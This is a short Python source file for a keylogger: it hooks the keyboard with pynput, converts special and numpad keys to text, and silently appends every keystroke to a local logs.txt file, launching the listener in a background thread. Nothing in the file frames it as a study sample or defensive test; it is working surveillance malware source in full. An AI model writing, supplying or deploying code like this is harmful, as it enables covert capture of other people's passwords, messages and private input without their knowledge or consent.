from pynput.keyboard import Listener
from threading import Timer , Thread


class Keylogger:

    
    def onpresses(self,key):
        
        keys=str(key)
        keys = keys.replace("'", "")

        if keys == 'Key.space':
            keys = ' '
        if keys == 'Key.backspace':
            keys = 'backspace'
        if keys == 'Key.shift':
            keys = ''
        if keys == "Key.caps_lock":
            keys = ''
        if keys == "Key.shift_r":
            keys = ''
        if keys == "Key.enter":
            keys = '\n'
        if keys == "<96>":
            keys = '0'
        if keys == "<97>":
            keys = '1'
        if keys == "<98>":
            keys = '2'            
        if keys == "<99>":
            keys = '3'
        if keys == "<100>":
            keys = '4'
        if keys == "<101>":
            keys = '5'
        if keys == "<102>":
            keys = '6'
        if keys == "<103>":
            keys = '7'
        if keys == "<104>":
            keys = '8'
        if keys == "<105>":
            keys = '9'

        with open(r".\logs.txt", 'a') as f:
            f.write(keys)

    def start(self):
        
        with Listener(on_press=self.onpresses) as l:
            l.join()

    def run(self):
            Thread(target=self.start).start()
        
 
execute=Keylogger()
execute.run()

